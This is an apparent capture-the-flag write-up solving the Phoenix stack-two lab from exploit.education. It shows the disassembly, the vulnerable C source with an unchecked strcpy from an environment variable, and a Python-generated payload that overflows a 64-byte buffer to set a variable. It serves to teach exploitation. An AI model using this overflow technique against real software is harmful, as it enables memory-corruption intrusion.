# PHOENIX - stack 2

Lets list our files using ```ls -la```,

```
user@phoenix-amd64:~$ ls -la
total 28
drwxr-xr-x 2 user user 4096 Jun  6 04:14 .
drwxr-xr-x 3 root root 4096 Jan 13  2019 ..
-rw-r--r-- 1 user user  220 Jan 13  2019 .bash_logout
-rw-r--r-- 1 user user 3526 Jan 13  2019 .bashrc
-rw-r--r-- 1 user user  675 Jan 13  2019 .profile
-rwxr-xr-x 1 user user 6288 Jun  6 04:14 stack-two
```

Lets analyse the file type of the binary using ```file``` command,

```
user@phoenix-amd64:~$ file stack-two
stack-two: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /opt/phoenix/x86_64-linux-musl/lib/ld-musl-x86_64.so.1, not stripped
```

Lets try running it,

```
user@phoenix-amd64:~$ ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
stack-two: please set the ExploitEducation environment variable
```

So its asking use to set an environment variable

Lets analyse it with our debugger,

The functions inside the binary,

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x00000000004004b0  _init
0x00000000004004d0  strcpy@plt
0x00000000004004e0  printf@plt
0x00000000004004f0  getenv@plt
0x0000000000400500  puts@plt
0x0000000000400510  errx@plt
0x0000000000400520  exit@plt
0x0000000000400530  __libc_start_main@plt
0x0000000000400540  _start
0x0000000000400556  _start_c
0x0000000000400580  deregister_tm_clones
0x00000000004005b0  register_tm_clones
0x00000000004005f0  __do_global_dtors_aux
0x0000000000400680  frame_dummy
0x00000000004006ad  main
0x0000000000400740  __do_global_ctors_aux
0x0000000000400782  _fini
```

Lets disassemble ```main()```,

```
pwndbg> disassemble main
Dump of assembler code for function main:
   0x00000000004006ad <+0>:	  push   rbp
   0x00000000004006ae <+1>:	  mov    rbp,rsp
   0x00000000004006b1 <+4>:	  sub    rsp,0x60
   0x00000000004006b5 <+8>:	  mov    DWORD PTR [rbp-0x54],edi
   0x00000000004006b8 <+11>:	mov    QWORD PTR [rbp-0x60],rsi
   0x00000000004006bc <+15>:	mov    edi,0x400790
   0x00000000004006c1 <+20>:	call   0x400500 <puts@plt>
   0x00000000004006c6 <+25>:	mov    edi,0x4007da
   0x00000000004006cb <+30>:	call   0x4004f0 <getenv@plt>
   0x00000000004006d0 <+35>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004006d4 <+39>:	cmp    QWORD PTR [rbp-0x8],0x0
   0x00000000004006d9 <+44>:	jne    0x4006ef <main+66>
   0x00000000004006db <+46>:	mov    esi,0x4007f0
   0x00000000004006e0 <+51>:	mov    edi,0x1
   0x00000000004006e5 <+56>:	mov    eax,0x0
   0x00000000004006ea <+61>:	call   0x400510 <errx@plt>
   0x00000000004006ef <+66>:	mov    DWORD PTR [rbp-0x10],0x0
   0x00000000004006f6 <+73>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004006fa <+77>:	lea    rax,[rbp-0x50]
   0x00000000004006fe <+81>:	mov    rsi,rdx
   0x0000000000400701 <+84>:	mov    rdi,rax
   0x0000000000400704 <+87>:	call   0x4004d0 <strcpy@plt>
   0x0000000000400709 <+92>:	mov    eax,DWORD PTR [rbp-0x10]
   0x000000000040070c <+95>:	cmp    eax,0xd0a090a
   0x0000000000400711 <+100>:	jne    0x40071f <main+114>
   0x0000000000400713 <+102>:	mov    edi,0x400828
   0x0000000000400718 <+107>:	call   0x400500 <puts@plt>
   0x000000000040071d <+112>:	jmp    0x400733 <main+134>
   0x000000000040071f <+114>:	mov    eax,DWORD PTR [rbp-0x10]
   0x0000000000400722 <+117>:	mov    esi,eax
   0x0000000000400724 <+119>:	mov    edi,0x400870
   0x0000000000400729 <+124>:	mov    eax,0x0
   0x000000000040072e <+129>:	call   0x4004e0 <printf@plt>
   0x0000000000400733 <+134>:	mov    edi,0x0
   0x0000000000400738 <+139>:	call   0x400520 <exit@plt>
End of assembler dump.
```

Lets view the source code for proper understanding,

```
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

It is same like previous challenges,

```buffer``` has 64 bytes and after it ```changeme``` is placed

```changeme``` is initialized with 0

But we need to overwrite the buffer with an environment variable

Here is the interesting part,

```
   0x00000000004006c6 <+25>:	mov    edi,0x4007da
   0x00000000004006cb <+30>:	call   0x4004f0 <getenv@plt>
```

When we view the memory ```0x4007da``` we can see the name of environment variable in it

```
pwndbg> x/s 0x4007da
0x4007da:	"ExploitEducation"
```

Now lets set the environment variable in the name of "ExploitEducation",

```
user@phoenix-amd64:~$ export ExploitEducation=monish
user@phoenix-amd64:~$ env | grep Exploit
ExploitEducation=monish
```

Now lets try running the binary,

```
user@phoenix-amd64:~$ ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a
```

So its just a normal buffer overflow like "stack-one"

But the ```buffer``` data comes from our environment variable,

```
ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

locals.changeme = 0;
strcpy(locals.buffer, ptr);
```

Now lets store our data in ```ExploitEducation``` env variable

```
user@phoenix-amd64:~$ export ExploitEducation=$(python -c "print('A'*64+'\x0a\x09\x0a\x0d')")
```

Lets try running our binary,

```
user@phoenix-amd64:~$ env | grep Exploit
ExploitEducation=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@phoenix-amd64:~$ ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

Done! We have completed our "stack-two" challenge


